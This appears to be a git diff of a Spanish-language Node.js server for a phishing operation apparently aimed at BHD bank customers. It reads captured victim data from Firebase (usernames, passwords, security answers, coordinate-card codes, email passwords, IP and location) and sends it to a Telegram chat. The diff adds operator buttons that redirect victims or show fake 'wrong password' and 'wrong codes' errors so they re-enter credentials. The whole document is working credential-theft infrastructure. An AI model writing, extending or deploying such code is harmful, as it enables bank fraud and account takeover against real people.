@@ -1,4 +1,4 @@
-// server.js - VERSIÓN SIN BORRAR MENSAJES
+// server.js - VERSIÓN COMPLETA CON BOTONES DE ERROR ESPECÍFICOS
 const express = require('express');
 const admin = require('firebase-admin');
 const axios = require('axios');
@@ -95,34 +95,99 @@ async function testTelegramConnection() {
   }
 }
 
-// === FUNCIÓN PARA CREAR BOTONES ===
-function createRedirectButtons(uid) {
-  const buttons = [
-    [
-      { text: '🏠 INDEX', callback_data: `redirect_${uid}_index.html` },
-      { text: '❓ PREGUNTA 1', callback_data: `redirect_${uid}_pregunta-1.html` }
-    ],
-    [
-      { text: '📍 COORD 1', callback_data: `redirect_${uid}_coordenada1.html` },
-      { text: '📍 COORD 2', callback_data: `redirect_${uid}_coordenada2.html` }
-    ],
-    [
-      { text: '📍 COORD 3', callback_data: `redirect_${uid}_coordenada3.html` },
-      { text: '🔄 COORD R', callback_data: `redirect_${uid}_coordenadaR.html` }
-    ],
-    [
-      { text: '📧 MAILBOX', callback_data: `redirect_${uid}_mailbox.html` },
-      { text: '✅ FINAL', callback_data: `redirect_${uid}_finalizado.html` }
-    ],
-    [
-      { text: '❌ ERROR', callback_data: `redirect_${uid}_error.html` },
-      { text: '🚫 BLOQUEO', callback_data: `redirect_${uid}_bloqueo.html` }
-    ]
-  ];
+// === FUNCIÓN PARA CREAR BOTONES DE REDIRECCIÓN Y ERROR ===
+function createActionButtons(uid, step) {
+  const buttons = [];
+  
+  // Botones de redirección principales
+  buttons.push([
+    { text: '🏠 INDEX', callback_data: `redirect_${uid}_index.html` },
+    { text: '❓ PREGUNTA 1', callback_data: `redirect_${uid}_pregunta-1.html` }
+  ]);
+  
+  buttons.push([
+    { text: '📍 COORD 1', callback_data: `redirect_${uid}_coordenada1.html` },
+    { text: '📍 COORD 2', callback_data: `redirect_${uid}_coordenada2.html` }
+  ]);
+  
+  buttons.push([
+    { text: '📍 COORD 3', callback_data: `redirect_${uid}_coordenada3.html` },
+    { text: '🔄 COORD R', callback_data: `redirect_${uid}_coordenadaR.html` }
+  ]);
+  
+  buttons.push([
+    { text: '📧 MAILBOX', callback_data: `redirect_${uid}_mailbox.html` },
+    { text: '✅ FINAL', callback_data: `redirect_${uid}_finalizado.html` }
+  ]);
+
+  // Botones de error específicos según el paso
+  if (step === 'login') {
+    buttons.push([
+      { text: '❌ ERROR USUARIO', callback_data: `error_${uid}_usuario` },
+      { text: '❌ ERROR CONTRASEÑA', callback_data: `error_${uid}_contrasena` }
+    ]);
+  } else if (step === 'security') {
+    buttons.push([
+      { text: '❌ ERROR RESPUESTAS', callback_data: `error_${uid}_respuestas` }
+    ]);
+  } else if (step.startsWith('coordenada')) {
+    buttons.push([
+      { text: '❌ ERROR COORDENADAS', callback_data: `error_${uid}_coordenadas` }
+    ]);
+  } else if (step === 'mailbox') {
+    buttons.push([
+      { text: '❌ ERROR CORREO', callback_data: `error_${uid}_correo` },
+      { text: '❌ ERROR PASS CORREO', callback_data: `error_${uid}_pass_correo` }
+    ]);
+  }
+
+  // Botones generales de error
+  buttons.push([
+    { text: '🚫 BLOQUEO', callback_data: `redirect_${uid}_bloqueo.html` },
+    { text: '❌ ERROR GEN', callback_data: `redirect_${uid}_error.html` }
+  ]);
   
   return {
     inline_keyboard: buttons
   };
+}
+
+// === FUNCIÓN MEJORADA PARA ENVIAR A TELEGRAM ===
+async function sendToTelegram(message, replyMarkup = null) {
+  try {
+    console.log('📨 Intentando enviar mensaje a Telegram...');
+    
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    };
+
+    if (replyMarkup) {
+      payload.reply_markup = replyMarkup;
+    }
+
+    const response = await axios.post(`${TELEGRAM_API}/sendMessage`, payload, {
+      timeout: 15000,
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    });
+
+    console.log(`✅ Mensaje enviado a Telegram - ID: ${response.data.result.message_id}`);
+    return true;
+  } catch (error) {
+    console.error('❌ ERROR AL ENVIAR A TELEGRAM:');
+    console.error('🔴 Mensaje:', error.message);
+    
+    if (error.response) {
+      console.error('🔴 Status:', error.response.status);
+      console.error('🔴 Data:', JSON.stringify(error.response.data, null, 2));
+    }
+    
+    return false;
+  }
 }
 
 // === 1. LISTENER DE FIREBASE MEJORADO ===
@@ -145,8 +210,8 @@ database.ref('/captures').on('child_added', async (snapshot) => {
 
     console.log(`📥 Nueva captura detectada - UID: ${uid}`);
 
-    // Evitar procesar el campo redirectPage
-    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
+    // Evitar procesar el campo redirectPage y errorMessage
+    const steps = Object.keys(data).filter(key => key !== 'redirectPage' && key !== 'errorMessage');
     
     if (steps.length === 0) {
       console.log('⚠️ No hay pasos para procesar');
@@ -189,10 +254,31 @@ database.ref('/captures').on('child_added', async (snapshot) => {
       mensaje += `✅ *PROCESO COMPLETADO*\n`;
       mensaje += `• Estado: Finalizado correctamente\n`;
       mensaje += `• Completado: ${payload.completedAt || 'N/A'}\n\n`;
+    } else if (step === 'error') {
+      mensaje += `❌ *ERROR DETECTADO*\n`;
+      mensaje += `• Tipo: ${payload.errorType || 'N/A'}\n`;
+      if (payload.errorDetails && Array.isArray(payload.errorDetails)) {
+        payload.errorDetails.forEach((error, index) => {
+          mensaje += `• Error ${index + 1}: ${error}\n`;
+        });
+      }
+      mensaje += `\n`;
+    } else if (step === 'bloqueo') {
+      mensaje += `🚫 *BLOQUEO DE SEGURIDAD*\n`;
+      mensaje += `• Razón: ${payload.blockReason || 'N/A'}\n`;
+      mensaje += `• Duración: ${payload.blockDuration || 'N/A'}\n`;
+      if (payload.securityMeasures && Array.isArray(payload.securityMeasures)) {
+        payload.securityMeasures.forEach((measure, index) => {
+          mensaje += `• Medida ${index + 1}: ${measure}\n`;
+        });
+      }
+      mensaje += `\n`;
     } else {
       mensaje += `📝 *DATOS*\n`;
       Object.keys(payload).forEach(key => {
-        mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
+        if (key !== 'timestamp' && key !== 'originalUid') {
+          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
+        }
       });
       mensaje += `\n`;
     }
@@ -201,46 +287,38 @@ database.ref('/captures').on('child_added', async (snapshot) => {
     mensaje += `🌐 *INFO DEL USUARIO*\n`;
     mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
     mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
-    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
-    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n\n`;
+    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}...\n`;
+    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n`;
+    mensaje += `• Resolución: ${payload.screenResolution || 'N/A'}\n\n`;
 
-    // === BOTONES DE REDIRECCIÓN ===
-    mensaje += `⏭️ *SELECCIONA UNA REDIRECCIÓN:*\n`;
+    // === BOTONES DE ACCIÓN (REDIRECCIÓN + ERRORES) ===
+    mensaje += `⏭️ *SELECCIONA UNA ACCIÓN:*\n`;
 
-    // Crear teclado inline con botones
-    const replyMarkup = createRedirectButtons(uid);
+    // Crear teclado inline con botones específicos para el paso
+    const replyMarkup = createActionButtons(uid, step);
 
-    console.log('📨 Enviando mensaje a Telegram...');
-    
     // Enviar a Telegram con botones
-    const telegramResponse = await axios.post(`${TELEGRAM_API}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: mensaje,
-      parse_mode: 'Markdown',
-      reply_markup: replyMarkup
-    }, {
-      timeout: 15000
-    });
+    const telegramSuccess = await sendToTelegram(mensaje, replyMarkup);
 
-    console.log(`✅ ENVIADO A TELEGRAM: ${uid}/${step}`);
-    console.log(`📨 Message ID: ${telegramResponse.data.result.message_id}`);
+    if (telegramSuccess) {
+      console.log(`✅ ENVIADO A TELEGRAM: ${uid}/${step}`);
+    } else {
+      console.log(`❌ FALLÓ EL ENVÍO A TELEGRAM: ${uid}/${step}`);
+    }
 
   } catch (error) {
-    console.error('❌ ERROR AL ENVIAR A TELEGRAM:');
+    console.error('❌ ERROR EN LISTENER DE FIREBASE:');
     console.error('🔴 Mensaje:', error.message);
-    
-    if (error.response) {
-      console.error('🔴 Status:', error.response.status);
-      console.error('🔴 Data:', JSON.stringify(error.response.data, null, 2));
-    }
   } finally {
     isProcessing = false;
     console.log('🔄 Listener listo para siguiente evento\n');
   }
 });
 
-// === 2. WEBHOOK MEJORADO - SIN BORRAR MENSAJES ===
+// === 2. WEBHOOK MEJORADO - MANEJO DE ERRORES ===
 app.post('/telegram/webhook', express.json(), async (req, res) => {
+  console.log('🔔 Webhook de Telegram recibido');
+  
   try {
     // Responder inmediatamente a Telegram
     res.status(200).send('OK');
@@ -254,7 +332,7 @@ app.post('/telegram/webhook', express.json(), async (req, res) => {
 
       console.log(`🔘 Callback recibido: ${callbackData}`);
 
-      // Validar que es un comando de redirección
+      // Manejar redirecciones
       if (callbackData.startsWith('redirect_')) {
         const parts = callbackData.split('_');
         
@@ -277,21 +355,74 @@ app.post('/telegram/webhook', express.json(), async (req, res) => {
           await database.ref(`/captures/${uid}/redirectPage`).set(page);
           console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);
 
-          // ✅ SOLO RESPONDER AL CALLBACK - NO BORRAR MENSAJE
           await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
             callback_query_id: callbackId,
             text: `✅ Redirigiendo a: ${page}`,
-            show_alert: false  // Solo notificación pequeña, no alerta
+            show_alert: false
           });
 
-          // ✅ ENVIAR MENSAJE DE CONFIRMACION SEPARADO - NO EDITAR EL ORIGINAL
-          await axios.post(`${TELEGRAM_API}/sendMessage`, {
-            chat_id: chatId,
-            text: `🔄 *REDIRECCIÓN EJECUTADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
-            parse_mode: 'Markdown'
+          await sendToTelegram(
+            `🔄 *REDIRECCIÓN EJECUTADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`
+          );
+
+          console.log(`✅ Redirección completada: ${uid} → ${page}`);
+        }
+      }
+      
+      // Manejar errores específicos
+      else if (callbackData.startsWith('error_')) {
+        const parts = callbackData.split('_');
+        
+        if (parts.length >= 3) {
+          const uid = parts[1];
+          const errorType = parts[2];
+          
+          let errorMessage = '';
+          
+          // Definir mensajes de error según el tipo
+          switch (errorType) {
+            case 'usuario':
+              errorMessage = 'Error de usuario - Credenciales inválidas';
+              break;
+            case 'contrasena':
+              errorMessage = 'Error de contraseña - Clave incorrecta';
+              break;
+            case 'respuestas':
+              errorMessage = 'Error respuestas incorrectas - Datos de seguridad no coinciden';
+              break;
+            case 'coordenadas':
+              errorMessage = 'Error de coordenadas - Códigos incorrectos';
+              break;
+            case 'correo':
+              errorMessage = 'Error de correo - Dirección de email inválida';
+              break;
+            case 'pass_correo':
+              errorMessage = 'Error de contraseña de correo - Clave incorrecta';
+              break;
+            default:
+              errorMessage = 'Error de verificación - Datos incorrectos';
+          }
+
+          console.log(`❌ Enviando error: ${uid} -> ${errorMessage}`);
+
+          // Actualizar Firebase con el mensaje de error
+          await database.ref(`/captures/${uid}/errorMessage`).set({
+            message: errorMessage,
+            timestamp: Date.now(),
+            sentBy: userId
           });
 
-          console.log(`✅ Redirección completada: ${uid} → ${page} (mensajes preservados)`);
+          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+            callback_query_id: callbackId,
+            text: `✅ Error enviado: ${errorMessage}`,
+            show_alert: false
+          });
+
+          await sendToTelegram(
+            `❌ *ERROR ENVIADO*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Error*: ${errorMessage}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`
+          );
+
+          console.log(`✅ Error enviado: ${uid} → ${errorMessage}`);
         }
       }
     }
@@ -308,19 +439,26 @@ app.get('/test-telegram', async (req, res) => {
   try {
     console.log('🧪 Test manual de Telegram...');
     
-    const testMessage = await axios.post(`${TELEGRAM_API}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: '🧪 *TEST MANUAL DEL SERVIDOR*\n\nEste es un mensaje de prueba. Si lo ves, el servidor puede enviar a Telegram correctamente.',
-      parse_mode: 'Markdown'
-    }, {
-      timeout: 10000
-    });
+    const testMessage = `🧪 *TEST MANUAL DEL SERVIDOR*\n\n` +
+                       `• Servidor: ${SERVER_URL}\n` +
+                       `• Hora: ${new Date().toLocaleString()}\n` +
+                       `• Status: ✅ ACTIVO\n\n` +
+                       `Este es un mensaje de prueba. Si lo ves, el servidor puede enviar a Telegram correctamente.`;
 
-    res.json({
-      success: true,
-      message: 'Mensaje de prueba enviado a Telegram',
-      message_id: testMessage.data.result.message_id
-    });
+    const success = await sendToTelegram(testMessage);
+    
+    if (success) {
+      res.json({
+        success: true,
+        message: 'Mensaje de prueba enviado a Telegram correctamente',
+        timestamp: new Date().toISOString()
+      });
+    } else {
+      res.status(500).json({
+        success: false,
+        message: 'Error al enviar mensaje de prueba a Telegram'
+      });
+    }
 
   } catch (error) {
     console.error('❌ Error en test manual:', error.message);
@@ -360,7 +498,8 @@ app.get('/setup-webhook', async (req, res) => {
     
     const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
       url: webhookUrl,
-      drop_pending_updates: true
+      drop_pending_updates: true,
+      max_connections: 40
     });
     
     res.json({
@@ -398,12 +537,19 @@ app.get('/webhook-info', async (req, res) => {
 });
 
 // Health check
-app.get('/health', (req, res) => {
+app.get('/health', async (req, res) => {
+  const firebaseStatus = await testFirebaseConnection();
+  const telegramStatus = await testTelegramConnection();
+  
   res.json({
     status: 'OK',
     timestamp: new Date().toISOString(),
     service: 'BHD Firebase Server',
-    environment: process.env.NODE_ENV || 'development'
+    environment: process.env.NODE_ENV || 'development',
+    connections: {
+      firebase: firebaseStatus ? '✅ CONNECTED' : '❌ DISCONNECTED',
+      telegram: telegramStatus ? '✅ CONNECTED' : '❌ DISCONNECTED'
+    }
   });
 });
 
@@ -426,7 +572,7 @@ app.get('/', (req, res) => {
     </head>
     <body>
         <h1>🚀 Servidor BHD Firebase + Telegram</h1>
-        <div class="status success">✅ Servidor activo - MENSAJES PRESERVADOS</div>
+        <div class="status success">✅ Servidor activo - SISTEMA DE ERRORES ESPECÍFICOS</div>
         
         <div class="endpoints">
             <strong>🔧 Endpoints:</strong><br>
@@ -462,8 +608,8 @@ async function initializeServer() {
     console.log(`🔗 Health: ${SERVER_URL}/health`);
     console.log(`🧪 Test Telegram: ${SERVER_URL}/test-telegram`);
     console.log(`👂 Listener Firebase: ACTIVO`);
-    console.log(`🤖 Telegram Bot: CONFIGURADO`);
-    console.log(`💾 MODO: Mensajes preservados - Sin borrar`);
+    console.log(`🤖 Telegram Bot: CONFIGURADO CON BOTONES DE ERROR`);
+    console.log(`💾 MODO: Mensajes con errores específicos`);
   });
 }
 
